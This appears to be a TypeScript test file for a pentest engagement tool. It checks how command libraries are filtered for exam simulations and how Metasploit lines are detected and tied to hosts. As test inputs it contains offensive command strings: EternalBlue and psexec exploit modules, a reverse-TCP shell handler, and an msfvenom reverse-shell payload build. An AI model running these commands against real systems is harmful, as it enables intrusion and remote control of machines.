import { describe, it, expect } from 'vitest';
import type { Engagement } from '../../../types/engagement';
import type { Host } from '../../../types/host';
import type { LogEntry } from '../../../types/log';
import type { LibraryCommand } from '../../../engines/library/types';
import { BUILTIN_LIBRARY } from '../../../engines/library/data';
import { filterForKind, isMetasploitLine, metasploitHostIds, metasploitWarning } from '../../../engines/checklist';

const cmd = (id: string, exam?: LibraryCommand['exam']): LibraryCommand =>
  ({ id, title: id, tool: 't', template: id, os: 'any', runFrom: 'attacker', goals: [], source: 'raven', ...(exam ? { exam } : {}) }) as LibraryCommand;
const set = [cmd('plain'), cmd('banned', 'banned'), cmd('msf', 'metasploit')];

describe('filterForKind', () => {
  it('exam sim removes banned commands', () => {
    const { shown } = filterForKind(set, 'exam-sim', { hostId: 'a', msfHostId: null });
    expect(shown.map((c) => c.id)).not.toContain('banned');
    expect(shown.map((c) => c.id)).toContain('plain');
  });

  it('lab and client keep banned commands', () => {
    for (const kind of ['lab', 'client'] as const) {
      const { shown, msfMarker } = filterForKind(set, kind, { hostId: 'a', msfHostId: 'b' });
      expect(shown).toHaveLength(3);
      expect(msfMarker.size).toBe(0);
    }
  });

  it('metasploit commands show only on the locked host', () => {
    expect(filterForKind(set, 'exam-sim', { hostId: 'a', msfHostId: 'a' }).shown.map((c) => c.id)).toContain('msf');
    const other = filterForKind(set, 'exam-sim', { hostId: 'b', msfHostId: 'a' });
    expect(other.shown.map((c) => c.id)).not.toContain('msf');
    expect(other.msfMarker.size).toBe(0);
  });

  it('unlocked metasploit commands are marked', () => {
    const r = filterForKind(set, 'exam-sim', { hostId: 'a', msfHostId: null });
    expect(r.shown.map((c) => c.id)).toContain('msf');
    expect([...r.msfMarker]).toEqual(['msf']);
  });

  it('keeps Responder commands in exam sim (only poisoning/spoofing are banned)', () => {
    const responder = BUILTIN_LIBRARY.filter((c) => /responder/i.test(c.tool) && !(c.tags ?? []).some((t) => t === 'poisoning' || t === 'spoofing'));
    expect(responder.length).toBeGreaterThan(0);
    const { shown } = filterForKind(responder, 'exam-sim', { hostId: 'a', msfHostId: null });
    expect(shown.length).toBe(responder.filter((c) => c.exam !== 'banned').length);
  });
});

describe('isMetasploitLine rules', () => {
  it('short-form multi handler is not metasploit', () => {
    expect(isMetasploitLine('use multi/handler')).toBe(false);
    expect(isMetasploitLine('msf6 > use exploit/multi/handler')).toBe(false);
  });
  it('resource file without a module is not metasploit', () => {
    expect(isMetasploitLine('msfconsole')).toBe(false);
    expect(isMetasploitLine('msfconsole -q')).toBe(false);
    expect(isMetasploitLine('msfconsole -r handler.rc')).toBe(false);
    expect(isMetasploitLine('search ms17')).toBe(false);
  });
  it('prompt-prefixed use exploit counts', () => {
    expect(isMetasploitLine('msf6 > use exploit/windows/smb/psexec')).toBe(true);
    expect(isMetasploitLine('msf6 exploit(windows/smb/psexec) > use auxiliary/scanner/smb/smb_version')).toBe(true);
  });
  it('short-form exploit path counts', () => {
    expect(isMetasploitLine('use windows/smb/psexec')).toBe(true);
    expect(isMetasploitLine('msfconsole -x "use windows/smb/psexec; run"')).toBe(true);
  });
});

describe('isMetasploitLine', () => {
  it('flags msfconsole and module use', () => {
    expect(isMetasploitLine('sudo msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"')).toBe(true);
    expect(isMetasploitLine('use exploit/windows/smb/psexec')).toBe(true);
    expect(isMetasploitLine('use auxiliary/scanner/smb/smb_version')).toBe(true);
    expect(isMetasploitLine('use post/multi/manage/autoroute')).toBe(true);
  });

  it('multi/handler and msfvenom are never metasploit lines', () => {
    expect(isMetasploitLine('use exploit/multi/handler')).toBe(false);
    expect(isMetasploitLine('msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; run"')).toBe(false);
    expect(isMetasploitLine('msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 -f exe')).toBe(false);
    expect(isMetasploitLine('nmap -p 445 10.0.0.5')).toBe(false);
  });
});

const engagement = (over: Partial<Engagement> = {}): Engagement => ({
  id: 'lab', name: 'Acme', kind: 'exam-sim', client: null, subLabel: null, scopeCidrs: [], domain: null, startsAt: null,
  endsAt: null, timeboxStart: null, timeboxMinutes: null, status: 'active', createdAt: 0, updatedAt: 0,
  lastActivityAt: null, lastRanOn: null, msfHostId: null, ...over,
});
const host = (id: string, name: string, ip: string): Host => ({
  id, engagementId: 'lab', name, ip, os: 'windows', boardColumn: 'information-gathering', boardManual: false, access: 'none',
  createdAt: 0, updatedAt: 0, dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false,
});
const ms01 = host('ms01', 'MS01', '10.0.0.5');
const ms02 = host('ms02', 'MS02', '10.0.0.6');
const entry = (command: string, over: Partial<LogEntry> = {}): LogEntry => ({
  id: 'e', engagementId: 'lab', kind: 'command', title: 't', titleEdited: false, ranOn: 'Kali', hostIds: [],
  observations: null, returnedNothing: false, private: false, content: { kind: 'command', blocks: [{ command, output: '' }] },
  at: 1, createdAt: 1, updatedAt: 1, ...over,
});

describe('metasploit attribution and warning', () => {
  it('attributes the hosts a metasploit block names, and nothing for other lines', () => {
    expect(metasploitHostIds(entry('use exploit/windows/smb/psexec\nset RHOSTS 10.0.0.5'), engagement(), [ms01, ms02])).toEqual(['ms01']);
    expect(metasploitHostIds(entry('nmap 10.0.0.5'), engagement(), [ms01, ms02])).toEqual([]);
  });

  it('falls back to the entry host tags when no line names a host', () => {
    expect(metasploitHostIds(entry('use exploit/windows/smb/psexec', { hostIds: ['ms02', 'gone'] }), engagement(), [ms01, ms02])).toEqual(['ms02']);
  });

  it('meterpreter portfwd to another host does not warn', () => {
    const locked = engagement({ msfHostId: 'ms01' });
    const e = entry('', {
      content: { kind: 'command', blocks: [{ command: 'portfwd add -l 8080 -p 80 -r 10.0.0.6', output: '', shell: 'meterpreter MS01' }] },
    });
    const ids = metasploitHostIds(e, locked, [ms01, ms02]);
    expect(ids).toEqual(['ms01']);
    expect(metasploitWarning(e, locked, ids)).toBeNull();
  });

  it('warns only for another host than the locked one', () => {
    const locked = engagement({ msfHostId: 'ms01' });
    const e = entry('msfconsole -x "use exploit/windows/smb/psexec"');
    expect(metasploitWarning(e, locked, ['ms02'])).toMatch(/Metasploit/);
    expect(metasploitWarning(e, locked, ['ms01'])).toBeNull();
    expect(metasploitWarning(e, engagement(), ['ms02'])).toBeNull();
  });

  it('no warning outside exam sims', () => {
    const e = entry('msfconsole -x "use exploit/windows/smb/psexec"');
    for (const kind of ['lab', 'client'] as const) {
      expect(metasploitWarning(e, engagement({ kind, msfHostId: 'ms01' }), ['ms02'])).toBeNull();
    }
  });
});
